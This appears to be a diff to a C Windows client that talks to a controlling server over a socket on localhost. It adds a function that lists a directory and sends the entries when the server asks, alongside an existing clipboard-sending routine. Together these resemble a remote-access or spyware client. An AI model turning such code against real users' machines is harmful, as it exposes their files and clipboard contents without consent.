@@ -147,6 +147,44 @@ int sendClipboard(SOCKET socket) {
     return 0;
 }
 
+int get_files(char *path, SOCKET ConnectSocket)
+{
+    WIN32_FIND_DATA findFileData;
+    HANDLE hFind;
+    MESSAGE msg;
+    msg.header = GET_FILES;
+    msg.hasNext = TRUE;
+
+    char searchPath[MAX_PATH];
+
+    snprintf(searchPath, MAX_PATH, "%s\\*", path);
+
+    hFind = FindFirstFile(searchPath, &findFileData);
+
+    if (hFind == INVALID_HANDLE_VALUE) {
+        printf("FindFirstFile failed (%lu)\n", GetLastError());
+        return 1;
+    }
+
+    do {
+        memset(msg.payload, 0, 512);
+        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+            sprintf(msg.payload, "[DIR]  %s", findFileData.cFileName);
+        } else {
+            sprintf(msg.payload, "[FILE] %s", findFileData.cFileName);
+        }
+        msg.hasNext = NEXT_TRUE;
+        msg.header = GET_FILES;
+        send(ConnectSocket, (char *)&msg, sizeof(MESSAGE ), 0);
+    } while (FindNextFile(hFind, &findFileData) != 0);
+    msg.header = GET_FILES;
+    msg.hasNext = NEXT_FALSE;
+    memset(msg.payload, 0, 512);
+    send(ConnectSocket, (char *)&msg, sizeof(MESSAGE ), 0);
+    FindClose(hFind);
+    return 0;
+}
+
 int main()
 {
 
@@ -165,7 +203,7 @@ int main()
     ZeroMemory( &hints, sizeof(hints) );
     hints.ai_family   = AF_UNSPEC;
     hints.ai_socktype = SOCK_STREAM;
-    hints.ai_protocol = IPPROTO_TCP;
+    hints.ai_protocol = IPPROTO_IP;
 
     iResult = getaddrinfo("127.0.0.1", DEFAULT_PORT, &hints, &result);
     if (iResult != 0)
@@ -259,6 +297,13 @@ int main()
             memset(msg.payload, 0, 512);
             msg.hasNext = NEXT_FALSE;
             send(ConnectSocket, (char *)&msg, sizeof(MESSAGE ), 0);
+        }
+        if(msg.header == SIGNAL_FILES)
+        {
+            printf("%s\n", msg.payload);
+            get_files(msg.payload, ConnectSocket);
+
+
         }
     }
     closesocket(ConnectSocket);
